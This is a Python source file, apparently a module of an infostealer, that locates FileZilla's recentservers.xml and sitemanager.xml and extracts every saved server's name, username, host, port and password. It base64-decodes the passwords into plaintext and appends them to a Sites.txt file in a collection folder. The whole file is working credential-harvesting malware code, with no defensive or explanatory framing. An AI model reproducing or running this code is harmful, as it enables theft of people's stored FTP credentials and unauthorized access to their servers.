from base64 import b64decode
from xml.etree import ElementTree
from os import listdir, path, makedirs

from ..utils.config import FileZillaConfig


class FileZilla:

    def __init__(self, *args):

        self.config = FileZillaConfig()
        self.data_files = ["recentservers.xml", "sitemanager.xml"]

        for index, variable in enumerate(self.config.Variables):
            self.__dict__.update({variable: args[index]})

    def __create_folder(self):

        folder = rf"{self.storage_path}\{self.folder}"

        if not path.exists(folder):
            makedirs(folder)

    def __get_sites(self):

        if not path.exists(self.config.SitesPath):
            return

        files = listdir(self.config.SitesPath)

        if not any(file in self.data_files for file in files):
            return

        self.__create_folder()

        with open(rf"{self.storage_path}\{self.folder}\Sites.txt", "a", encoding="utf-8") as file_zilla:

            for file in self.data_files:

                root = ElementTree.parse(rf"{self.config.SitesPath}\{file}").getroot()

                if len(root) < 1:
                    return

                for server in root[0].findall("Server"):

                    site_name = server.find("Name").text if hasattr(server.find("Name"), "text") else ""
                    site_user = server.find("User").text if hasattr(server.find("User"), "text") else ""
                    site_pass = server.find("Pass").text if hasattr(server.find("Pass"), "text") else ""
                    site_host = server.find("Host").text if hasattr(server.find("Host"), "text") else ""
                    site_port = server.find("Port").text if hasattr(server.find("Port"), "text") else ""

                    site_pass = b64decode(site_pass).decode("utf-8")

                    file_zilla.write(f"Name: {site_name}\nUser: {site_user}\nPassword: {site_pass}\nHost: {site_host}\nPort: {site_port}\n\n")

        file_zilla.close()

    def run(self):

        try:

            if self.statuses[0] is True:
                self.__get_sites()

        except Exception as e:
            if self.errors is True: print(f"[FilleZilla]: {repr(e)}")
